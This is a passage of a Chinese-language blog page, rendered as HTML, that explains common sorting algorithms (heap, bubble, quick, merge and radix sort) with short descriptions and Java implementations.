a[]={49,38,65,97,76,13,27,49,78,34,12,64,5,4,62,99,98,54,56,17,18,23,34,15,35,25,53,51};  </span><br><span class=\"line\">    public  <span class=\"function\"><span class=\"title\">HeapSort</span></span>(){  </span><br><span class=\"line\">        heapSort(a);  </span><br><span class=\"line\">    }  </span><br><span class=\"line\">    public  void heapSort(int[] a){  </span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;&#x5F00;&#x59CB;&#x6392;&#x5E8F;&quot;</span>);  </span><br><span class=\"line\">        int arrayLength=a.length;  </span><br><span class=\"line\">        //&#x5FAA;&#x73AF;&#x5EFA;&#x5806;  </span><br><span class=\"line\">        <span class=\"keyword\">for</span>(int i=0;i&lt;arrayLength-1;i++){  </span><br><span class=\"line\">            //&#x5EFA;&#x5806;  </span><br><span class=\"line\"></span><br><span class=\"line\">      buildMaxHeap(a,arrayLength-1-i);  </span><br><span class=\"line\">            //&#x4EA4;&#x6362;&#x5806;&#x9876;&#x548C;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x5143;&#x7D20;  </span><br><span class=\"line\">            swap(a,0,arrayLength-1-i);  </span><br><span class=\"line\">            System.out.println(Arrays.toString(a));  </span><br><span class=\"line\">        }  </span><br><span class=\"line\">    }  </span><br><span class=\"line\"></span><br><span class=\"line\">    private  void swap(int[] data, int i, int j) {  </span><br><span class=\"line\">        // TODO Auto-generated method stub  </span><br><span class=\"line\">        int tmp=data[i];  </span><br><span class=\"line\">        data[i]=data[j];  </span><br><span class=\"line\">        data[j]=tmp;  </span><br><span class=\"line\">    }  </span><br><span class=\"line\">    //&#x5BF9;data&#x6570;&#x7EC4;&#x4ECE;0&#x5230;lastIndex&#x5EFA;&#x5927;&#x9876;&#x5806;  </span><br><span class=\"line\">    private void buildMaxHeap(int[] data, int lastIndex) {  </span><br><span class=\"line\">        // TODO Auto-generated method stub  </span><br><span class=\"line\">        //&#x4ECE;lastIndex&#x5904;&#x8282;&#x70B9;&#xFF08;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x8282;&#x70B9;&#xFF09;&#x7684;&#x7236;&#x8282;&#x70B9;&#x5F00;&#x59CB;  </span><br><span class=\"line\">        <span class=\"keyword\">for</span>(int i=(lastIndex-1)/2;i&gt;=0;i--){  </span><br><span class=\"line\">            //k&#x4FDD;&#x5B58;&#x6B63;&#x5728;&#x5224;&#x65AD;&#x7684;&#x8282;&#x70B9;  </span><br><span class=\"line\">            int k=i;  </span><br><span class=\"line\">            //&#x5982;&#x679C;&#x5F53;&#x524D;k&#x8282;&#x70B9;&#x7684;&#x5B50;&#x8282;&#x70B9;&#x5B58;&#x5728;  </span><br><span class=\"line\">            <span class=\"keyword\">while</span>(k*2+1&lt;=lastIndex){  </span><br><span class=\"line\">                //k&#x8282;&#x70B9;&#x7684;&#x5DE6;&#x5B50;&#x8282;&#x70B9;&#x7684;&#x7D22;&#x5F15;  </span><br><span class=\"line\">                int biggerIndex=2*k+1;  </span><br><span class=\"line\">                //&#x5982;&#x679C;biggerIndex&#x5C0F;&#x4E8E;lastIndex&#xFF0C;&#x5373;biggerIndex+1&#x4EE3;&#x8868;&#x7684;k&#x8282;&#x70B9;&#x7684;&#x53F3;&#x5B50;&#x8282;&#x70B9;&#x5B58;&#x5728;  </span><br><span class=\"line\">                <span class=\"keyword\">if</span>(biggerIndex&lt;lastIndex){  </span><br><span class=\"line\">                    //&#x82E5;&#x679C;&#x53F3;&#x5B50;&#x8282;&#x70B9;&#x7684;&#x503C;&#x8F83;&#x5927;  </span><br><span class=\"line\">                    <span class=\"keyword\">if</span>(data[biggerIndex]&lt;data[biggerIndex+1]){  </span><br><span class=\"line\">                        //biggerIndex&#x603B;&#x662F;&#x8BB0;&#x5F55;&#x8F83;&#x5927;&#x5B50;&#x8282;&#x70B9;&#x7684;&#x7D22;&#x5F15;  </span><br><span class=\"line\">                        biggerIndex++;  </span><br><span class=\"line\">                    }  </span><br><span class=\"line\">                }  </span><br><span class=\"line\">                //&#x5982;&#x679C;k&#x8282;&#x70B9;&#x7684;&#x503C;&#x5C0F;&#x4E8E;&#x5176;&#x8F83;&#x5927;&#x7684;&#x5B50;&#x8282;&#x70B9;&#x7684;&#x503C;  </span><br><span class=\"line\">                <span class=\"keyword\">if</span>(data[k]&lt;data[biggerIndex]){  </span><br><span class=\"line\">                    //&#x4EA4;&#x6362;&#x4ED6;&#x4EEC;  </span><br><span class=\"line\">                    swap(data,k,biggerIndex);  </span><br><span class=\"line\">                    //&#x5C06;biggerIndex&#x8D4B;&#x4E88;k&#xFF0C;&#x5F00;&#x59CB;<span class=\"keyword\">while</span>&#x5FAA;&#x73AF;&#x7684;&#x4E0B;&#x4E00;&#x6B21;&#x5FAA;&#x73AF;&#xFF0C;&#x91CD;&#x65B0;&#x4FDD;&#x8BC1;k&#x8282;&#x70B9;&#x7684;&#x503C;&#x5927;&#x4E8E;&#x5176;&#x5DE6;&#x53F3;&#x5B50;&#x8282;&#x70B9;&#x7684;&#x503C;  </span><br><span class=\"line\">                    k=biggerIndex;  </span><br><span class=\"line\">                }<span class=\"keyword\">else</span>{  </span><br><span class=\"line\">                    <span class=\"built_in\">break</span>;  </span><br><span class=\"line\">                }  </span><br><span class=\"line\">            }</span><br><span class=\"line\">        }</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"5&#x3001;&#x5192;&#x6CE1;&#x6392;&#x5E8F;\"><a href=\"#5&#x3001;&#x5192;&#x6CE1;&#x6392;&#x5E8F;\" class=\"headerlink\" title=\"5&#x3001;&#x5192;&#x6CE1;&#x6392;&#x5E8F;\"></a>5&#x3001;&#x5192;&#x6CE1;&#x6392;&#x5E8F;</h3><p>&#xFF08;1&#xFF09;&#x57FA;&#x672C;&#x601D;&#x60F3;&#xFF1A;&#x5728;&#x8981;&#x6392;&#x5E8F;&#x7684;&#x4E00;&#x7EC4;&#x6570;&#x4E2D;&#xFF0C;&#x5BF9;&#x5F53;&#x524D;&#x8FD8;&#x672A;&#x6392;&#x597D;&#x5E8F;&#x7684;&#x8303;&#x56F4;&#x5185;&#x7684;&#x5168;&#x90E8;&#x6570;&#xFF0C;&#x81EA;&#x4E0A;&#x800C;&#x4E0B;&#x5BF9;&#x76F8;&#x90BB;&#x7684;&#x4E24;&#x4E2A;&#x6570;&#x4F9D;&#x6B21;&#x8FDB;&#x884C;&#x6BD4;&#x8F83;&#x548C;&#x8C03;&#x6574;&#xFF0C;&#x8BA9;&#x8F83;&#x5927;&#x7684;&#x6570;&#x5F80;&#x4E0B;&#x6C89;&#xFF0C;&#x8F83;&#x5C0F;&#x7684;&#x5F80;&#x4E0A;&#x5192;&#x3002;&#x5373;&#xFF1A;&#x6BCF;&#x5F53;&#x4E24;&#x76F8;&#x90BB;&#x7684;&#x6570;&#x6BD4;&#x8F83;&#x540E;&#x53D1;&#x73B0;&#x5B83;&#x4EEC;&#x7684;&#x6392;&#x5E8F;&#x4E0E;&#x6392;&#x5E8F;&#x8981;&#x6C42;&#x76F8;&#x53CD;&#x65F6;&#xFF0C;&#x5C31;&#x5C06;&#x5B83;&#x4EEC;&#x4E92;&#x6362;&#x3002;<br>&#xFF08;2&#xFF09;&#x5B9E;&#x4F8B;&#xFF1A;<br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Java%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95/9.png\" alt=\"\"><br>&#xFF08;3&#xFF09;&#x7528;java&#x5B9E;&#x73B0;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class bubbleSort {  </span><br><span class=\"line\">public  <span class=\"function\"><span class=\"title\">bubbleSort</span></span>(){  </span><br><span class=\"line\">     int a[]={49,38,65,97,76,13,27,49,78,34,12,64,5,4,62,99,98,54,56,17,18,23,34,15,35,25,53,51};  </span><br><span class=\"line\">    int temp=0;  </span><br><span class=\"line\">    <span class=\"keyword\">for</span>(int i=0;i&lt;a.length-1;i++){  </span><br><span class=\"line\">        <span class=\"keyword\">for</span>(int j=0;j&lt;a.length-1-i;j++){  </span><br><span class=\"line\">        <span class=\"keyword\">if</span>(a[j]&gt;a[j+1]){  </span><br><span class=\"line\">            temp=a[j];  </span><br><span class=\"line\">            a[j]=a[j+1];  </span><br><span class=\"line\">            a[j+1]=temp;  </span><br><span class=\"line\">        }  </span><br><span class=\"line\">        }  </span><br><span class=\"line\">    }  </span><br><span class=\"line\">    <span class=\"keyword\">for</span>(int i=0;i&lt;a.length;i++)  </span><br><span class=\"line\">    System.out.println(a[i]);     </span><br><span class=\"line\">}  </span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"6&#x3001;&#x5FEB;&#x901F;&#x6392;&#x5E8F;\"><a href=\"#6&#x3001;&#x5FEB;&#x901F;&#x6392;&#x5E8F;\" class=\"headerlink\" title=\"6&#x3001;&#x5FEB;&#x901F;&#x6392;&#x5E8F;\"></a>6&#x3001;&#x5FEB;&#x901F;&#x6392;&#x5E8F;</h3><p>&#xFF08;1&#xFF09;&#x57FA;&#x672C;&#x601D;&#x60F3;&#xFF1A;&#x9009;&#x62E9;&#x4E00;&#x4E2A;&#x57FA;&#x51C6;&#x5143;&#x7D20;,&#x901A;&#x5E38;&#x9009;&#x62E9;&#x7B2C;&#x4E00;&#x4E2A;&#x5143;&#x7D20;&#x6216;&#x8005;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x5143;&#x7D20;,&#x901A;&#x8FC7;&#x4E00;&#x8D9F;&#x626B;&#x63CF;&#xFF0C;&#x5C06;&#x5F85;&#x6392;&#x5E8F;&#x5217;&#x5206;&#x6210;&#x4E24;&#x90E8;&#x5206;,&#x4E00;&#x90E8;&#x5206;&#x6BD4;&#x57FA;&#x51C6;&#x5143;&#x7D20;&#x5C0F;,&#x4E00;&#x90E8;&#x5206;&#x5927;&#x4E8E;&#x7B49;&#x4E8E;&#x57FA;&#x51C6;&#x5143;&#x7D20;,&#x6B64;&#x65F6;&#x57FA;&#x51C6;&#x5143;&#x7D20;&#x5728;&#x5176;&#x6392;&#x597D;&#x5E8F;&#x540E;&#x7684;&#x6B63;&#x786E;&#x4F4D;&#x7F6E;,&#x7136;&#x540E;&#x518D;&#x7528;&#x540C;&#x6837;&#x7684;&#x65B9;&#x6CD5;&#x9012;&#x5F52;&#x5730;&#x6392;&#x5E8F;&#x5212;&#x5206;&#x7684;&#x4E24;&#x90E8;&#x5206;&#x3002;<br>&#xFF08;2&#xFF09;&#x5B9E;&#x4F8B;&#xFF1A;<br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Java%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95/10.png\" alt=\"\"><br>&#xFF08;3&#xFF09;&#x7528;java&#x5B9E;&#x73B0;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class quickSort {  </span><br><span class=\"line\">  int a[]={49,38,65,97,76,13,27,49,78,34,12,64,5,4,62,99,98,54,56,17,18,23,34,15,35,25,53,51};  </span><br><span class=\"line\">public  <span class=\"function\"><span class=\"title\">quickSort</span></span>(){  </span><br><span class=\"line\">    quick(a);  </span><br><span class=\"line\">    <span class=\"keyword\">for</span>(int i=0;i&lt;a.length;i++)  </span><br><span class=\"line\">        System.out.println(a[i]);  </span><br><span class=\"line\">}  </span><br><span class=\"line\">public int getMiddle(int[] list, int low, int high) {     </span><br><span class=\"line\">            int tmp = list[low];    //&#x6570;&#x7EC4;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x4F5C;&#x4E3A;&#x4E2D;&#x8F74;     </span><br><span class=\"line\">            <span class=\"keyword\">while</span> (low &lt; high) {     </span><br><span class=\"line\">                <span class=\"keyword\">while</span> (low &lt; high &amp;&amp; list[high] &gt;= tmp) {     </span><br><span class=\"line\"></span><br><span class=\"line\">      high--;     </span><br><span class=\"line\">                }     </span><br><span class=\"line\">                list[low] = list[high];   //&#x6BD4;&#x4E2D;&#x8F74;&#x5C0F;&#x7684;&#x8BB0;&#x5F55;&#x79FB;&#x5230;&#x4F4E;&#x7AEF;     </span><br><span class=\"line\">                <span class=\"keyword\">while</span> (low &lt; high &amp;&amp; list[low] &lt;= tmp) {     </span><br><span class=\"line\">                    low++;     </span><br><span class=\"line\">                }     </span><br><span class=\"line\">                list[high] = list[low];   //&#x6BD4;&#x4E2D;&#x8F74;&#x5927;&#x7684;&#x8BB0;&#x5F55;&#x79FB;&#x5230;&#x9AD8;&#x7AEF;     </span><br><span class=\"line\">            }     </span><br><span class=\"line\">           list[low] = tmp;              //&#x4E2D;&#x8F74;&#x8BB0;&#x5F55;&#x5230;&#x5C3E;     </span><br><span class=\"line\">            <span class=\"built_in\">return</span> low;                   //&#x8FD4;&#x56DE;&#x4E2D;&#x8F74;&#x7684;&#x4F4D;&#x7F6E;     </span><br><span class=\"line\">        }    </span><br><span class=\"line\">public void _quickSort(int[] list, int low, int high) {     </span><br><span class=\"line\">            <span class=\"keyword\">if</span> (low &lt; high) {     </span><br><span class=\"line\">               int middle = getMiddle(list, low, high);  //&#x5C06;list&#x6570;&#x7EC4;&#x8FDB;&#x884C;&#x4E00;&#x5206;&#x4E3A;&#x4E8C;     </span><br><span class=\"line\">                _quickSort(list, low, middle - 1);        //&#x5BF9;&#x4F4E;&#x5B57;&#x8868;&#x8FDB;&#x884C;&#x9012;&#x5F52;&#x6392;&#x5E8F;     </span><br><span class=\"line\">               _quickSort(list, middle + 1, high);       //&#x5BF9;&#x9AD8;&#x5B57;&#x8868;&#x8FDB;&#x884C;&#x9012;&#x5F52;&#x6392;&#x5E8F;     </span><br><span class=\"line\">            }     </span><br><span class=\"line\">        }   </span><br><span class=\"line\">public void quick(int[] a2) {     </span><br><span class=\"line\">            <span class=\"keyword\">if</span> (a2.length &gt; 0) {    //&#x67E5;&#x770B;&#x6570;&#x7EC4;&#x662F;&#x5426;&#x4E3A;&#x7A7A;     </span><br><span class=\"line\">                _quickSort(a2, 0, a2.length - 1);     </span><br><span class=\"line\">        }     </span><br><span class=\"line\">       }   </span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"7&#x3001;&#x5F52;&#x5E76;&#x6392;&#x5E8F;\"><a href=\"#7&#x3001;&#x5F52;&#x5E76;&#x6392;&#x5E8F;\" class=\"headerlink\" title=\"7&#x3001;&#x5F52;&#x5E76;&#x6392;&#x5E8F;\"></a>7&#x3001;&#x5F52;&#x5E76;&#x6392;&#x5E8F;</h3><p>&#xFF08;1&#xFF09;&#x57FA;&#x672C;&#x6392;&#x5E8F;&#xFF1A;&#x5F52;&#x5E76;&#xFF08;Merge&#xFF09;&#x6392;&#x5E8F;&#x6CD5;&#x662F;&#x5C06;&#x4E24;&#x4E2A;&#xFF08;&#x6216;&#x4E24;&#x4E2A;&#x4EE5;&#x4E0A;&#xFF09;&#x6709;&#x5E8F;&#x8868;&#x5408;&#x5E76;&#x6210;&#x4E00;&#x4E2A;&#x65B0;&#x7684;&#x6709;&#x5E8F;&#x8868;&#xFF0C;&#x5373;&#x628A;&#x5F85;&#x6392;&#x5E8F;&#x5E8F;&#x5217;&#x5206;&#x4E3A;&#x82E5;&#x5E72;&#x4E2A;&#x5B50;&#x5E8F;&#x5217;&#xFF0C;&#x6BCF;&#x4E2A;&#x5B50;&#x5E8F;&#x5217;&#x662F;&#x6709;&#x5E8F;&#x7684;&#x3002;&#x7136;&#x540E;&#x518D;&#x628A;&#x6709;&#x5E8F;&#x5B50;&#x5E8F;&#x5217;&#x5408;&#x5E76;&#x4E3A;&#x6574;&#x4F53;&#x6709;&#x5E8F;&#x5E8F;&#x5217;&#x3002;<br>&#xFF08;2&#xFF09;&#x5B9E;&#x4F8B;&#xFF1A;<br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Java%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95/11.png\" alt=\"\"><br>&#xFF08;3&#xFF09;&#x7528;java&#x5B9E;&#x73B0;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import java.util.Arrays;  </span><br><span class=\"line\"></span><br><span class=\"line\">public class mergingSort {  </span><br><span class=\"line\">int a[]={49,38,65,97,76,13,27,49,78,34,12,64,5,4,62,99,98,54,56,17,18,23,34,15,35,25,53,51};  </span><br><span class=\"line\">public  <span class=\"function\"><span class=\"title\">mergingSort</span></span>(){  </span><br><span class=\"line\">    sort(a,0,a.length-1);  </span><br><span class=\"line\">    <span class=\"keyword\">for</span>(int i=0;i&lt;a.length;i++)  </span><br><span class=\"line\">        System.out.println(a[i]);  </span><br><span class=\"line\">}  </span><br><span class=\"line\">public void sort(int[] data, int left, int right) {  </span><br><span class=\"line\">    // TODO Auto-generated method stub  </span><br><span class=\"line\">    <span class=\"keyword\">if</span>(left&lt;right){  </span><br><span class=\"line\">        //&#x627E;&#x51FA;&#x4E2D;&#x95F4;&#x7D22;&#x5F15;  </span><br><span class=\"line\">        int center=(left+right)/2;  </span><br><span class=\"line\">        //&#x5BF9;&#x5DE6;&#x8FB9;&#x6570;&#x7EC4;&#x8FDB;&#x884C;&#x9012;&#x5F52;  </span><br><span class=\"line\">        sort(data,left,center);  </span><br><span class=\"line\">        //&#x5BF9;&#x53F3;&#x8FB9;&#x6570;&#x7EC4;&#x8FDB;&#x884C;&#x9012;&#x5F52;  </span><br><span class=\"line\">        sort(data,center+1,right);  </span><br><span class=\"line\">        //&#x5408;&#x5E76;  </span><br><span class=\"line\">        merge(data,left,center,right);  </span><br><span class=\"line\"></span><br><span class=\"line\">    }  </span><br><span class=\"line\">}  </span><br><span class=\"line\">public void merge(int[] data, int left, int center, int right) {  </span><br><span class=\"line\">    // TODO Auto-generated method stub  </span><br><span class=\"line\">    int [] tmpArr=new int[data.length];  </span><br><span class=\"line\">    int mid=center+1;  </span><br><span class=\"line\">    //third&#x8BB0;&#x5F55;&#x4E2D;&#x95F4;&#x6570;&#x7EC4;&#x7684;&#x7D22;&#x5F15;  </span><br><span class=\"line\">    int third=left;  </span><br><span class=\"line\">    int tmp=left;  </span><br><span class=\"line\">    <span class=\"keyword\">while</span>(left&lt;=center&amp;&amp;mid&lt;=right){  </span><br><span class=\"line\"></span><br><span class=\"line\">   //&#x4ECE;&#x4E24;&#x4E2A;&#x6570;&#x7EC4;&#x4E2D;&#x53D6;&#x51FA;&#x6700;&#x5C0F;&#x7684;&#x653E;&#x5165;&#x4E2D;&#x95F4;&#x6570;&#x7EC4;  </span><br><span class=\"line\">        <span class=\"keyword\">if</span>(data[left]&lt;=data[mid]){  </span><br><span class=\"line\">            tmpArr[third++]=data[left++];  </span><br><span class=\"line\">        }<span class=\"keyword\">else</span>{  </span><br><span class=\"line\">            tmpArr[third++]=data[mid++];  </span><br><span class=\"line\">        }  </span><br><span class=\"line\">    }  </span><br><span class=\"line\">    //&#x5269;&#x4F59;&#x90E8;&#x5206;&#x4F9D;&#x6B21;&#x653E;&#x5165;&#x4E2D;&#x95F4;&#x6570;&#x7EC4;  </span><br><span class=\"line\">    <span class=\"keyword\">while</span>(mid&lt;=right){  </span><br><span class=\"line\">        tmpArr[third++]=data[mid++];  </span><br><span class=\"line\">    }  </span><br><span class=\"line\">    <span class=\"keyword\">while</span>(left&lt;=center){  </span><br><span class=\"line\">        tmpArr[third++]=data[left++];  </span><br><span class=\"line\">    }  </span><br><span class=\"line\">    //&#x5C06;&#x4E2D;&#x95F4;&#x6570;&#x7EC4;&#x4E2D;&#x7684;&#x5185;&#x5BB9;&#x590D;&#x5236;&#x56DE;&#x539F;&#x6570;&#x7EC4;  </span><br><span class=\"line\">    <span class=\"keyword\">while</span>(tmp&lt;=right){  </span><br><span class=\"line\">        data[tmp]=tmpArr[tmp++];  </span><br><span class=\"line\">    }  </span><br><span class=\"line\">    System.out.println(Arrays.toString(data));  </span><br><span class=\"line\">}  </span><br><span class=\"line\"></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"8&#x3001;&#x57FA;&#x6570;&#x6392;&#x5E8F;\"><a href=\"#8&#x3001;&#x57FA;&#x6570;&#x6392;&#x5E8F;\" class=\"headerlink\" title=\"8&#x3001;&#x57FA;&#x6570;&#x6392;&#x5E8F;\"></a>8&#x3001;&#x57FA;&#x6570;&#x6392;&#x5E8F;</h3><p>&#xFF08;1&#xFF09;&#x57FA;&#x672C;&#x601D;&#x60F3;&#xFF1A;&#x5C06;&#x6240;&#x6709;&#x5F85;&#x6BD4;&#x8F83;&#x6570;&#x503C;&#xFF08;&#x6B63;&#x6574;&#x6570;&#xFF09;&#x7EDF;&#x4E00;&#x4E3A;&#x540C;&#x6837;&#x7684;&#x6570;&#x4F4D;&#x957F;&#x5EA6;&#xFF0C;&#x6570;&#x4F4D;&#x8F83;&#x77ED;&#x7684;&#x6570;&#x524D;&#x9762;&#x8865;&#x96F6;&#x3002;&#x7136;&#x540E;&#xFF0C;&#x4ECE;&#x6700;&#x4F4E;&#x4F4D;&#x5F00;&#x59CB;&#xFF0C;&#x4F9D;&#x6B21;&#x8FDB;&#x884C;&#x4E00;&#x6B21;&#x6392;&#x5E8F;&#x3002;&#x8FD9;&#x6837;&#x4ECE;&#x6700;&#x4F4E;&#x4F4D;&#x6392;&#x5E8F;&#x4E00;&#x76F4;&#x5230;&#x6700;&#x9AD8;&#x4F4D;&#x6392;&#x5E8F;&#x5B8C;&#x6210;&#x4EE5;&#x540E;,&#x6570;&#x5217;&#x5C31;&#x53D8;&#x6210;&#x4E00;&#x4E2A;&#x6709;&#x5E8F;&#x5E8F;&#x5217;&#x3002;<br>&#xFF08;2&#xFF09;&#x5B9E;&#x4F8B;&#xFF1A;<br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Java%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95/12.png\" alt=\"\"><br>&#xFF08;3&#xFF09;&#x7528;java&#x5B9E;&#x73B0;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import java.util.ArrayList;  </span><br><span class=\"line\">import java.util.List;  </span><br><span class=\"line\"></span><br><span class=\"line\">public class radixSort {  </span><br><span class=\"line\">    int a[]={49,38,65,97,76,13,27,49,78,34,12,64,5,4,62,99,98,54,101,56,17,18,23,34,15,35,25,53,51};  </span><br><span class=\"line\">public <span class=\"function\"><span class=\"title\">radixSort</span></span>(){  </span><br><span class=\"line\">    sort(a);  </span><br><span class=\"line\">    <span class=\"keyword\">for</span>(int i=0;i&lt;a.length;i++)  </span><br><span class=\"line\">        System.out.println(a[i]);  </span><br><span class=\"line\">}  </span><br><span class=\"line\">public  void sort(int[] array){     </span><br><span class=\"line\"></span><br><span class=\"line\">            //&#x9996;&#x5148;&#x786E;&#x5B9A;&#x6392;&#x5E8F;&#x7684;&#x8D9F;&#x6570;;     </span><br><span class=\"line\">        int max=array[0];     </span><br><span class=\"line\">        <span class=\"keyword\">for</span>(int i=1;i&lt;array.length;i++){     </span><br><span class=\"line\">               <span class=\"keyword\">if</span>(array[i]&gt;max){     </span><br><span class=\"line\">               max=array[i];     </span><br><span class=\"line\">               }     </span><br><span class=\"line\">            }     </span><br><span class=\"line\"></span><br><span class=\"line\">    int time=0;     </span><br><span class=\"line\">           //&#x5224;&#x65AD;&#x4F4D;&#x6570;;     </span><br><span class=\"line\">            <span class=\"keyword\">while</span>(max&gt;0){     </span><br><span class=\"line\">               max/=10;     </span><br><span class=\"line\">                time++;     </span><br><span class=\"line\">            }     </span><br><span class=\"line\"></span><br><span class=\"line\">        //&#x5EFA;&#x7ACB;10&#x4E2A;&#x961F;&#x5217;;     </span><br><span class=\"line\">            List&lt;ArrayList&gt; queue=new ArrayList&lt;ArrayList&gt;();     </span><br><span class=\"line\">            <span class=\"keyword\">for</span>(int i=0;i&lt;10;i++){     </span><br><span class=\"line\">                ArrayList&lt;Integer&gt; queue1=new ArrayList&lt;Integer&gt;();   </span><br><span class=\"line\">                queue.add(queue1);     </span><br><span class=\"line\">        }     </span><br><span class=\"line\"></span><br><span class=\"line\">            //&#x8FDB;&#x884C;time&#x6B21;&#x5206;&#x914D;&#x548C;&#x6536;&#x96C6;;     </span><br><span class=\"line\">            <span class=\"keyword\">for</span>(int i=0;i&lt;time;i++){     </span><br><span class=\"line\"></span><br><span class=\"line\">                //&#x5206;&#x914D;&#x6570;&#x7EC4;&#x5143;&#x7D20;;     </span><br><span class=\"line\">               <span class=\"keyword\">for</span>(int j=0;j&lt;array.length;j++){     </span><br><span class=\"line\">                    //&#x5F97;&#x5230;&#x6570;&#x5B57;&#x7684;&#x7B2C;time+1&#x4F4D;&#x6570;;   </span><br><span class=\"line\">                   int x=array[j]%(int)Math.pow(10, i+1)/(int)Math.pow(10, i);  </span><br><span class=\"line\">                   ArrayList&lt;Integer&gt; queue2=queue.get(x);  </span><br><span class=\"line\">                   queue2.add(array[j]);  </span><br><span class=\"line\">                   queue.set(x, queue2);  </span><br><span 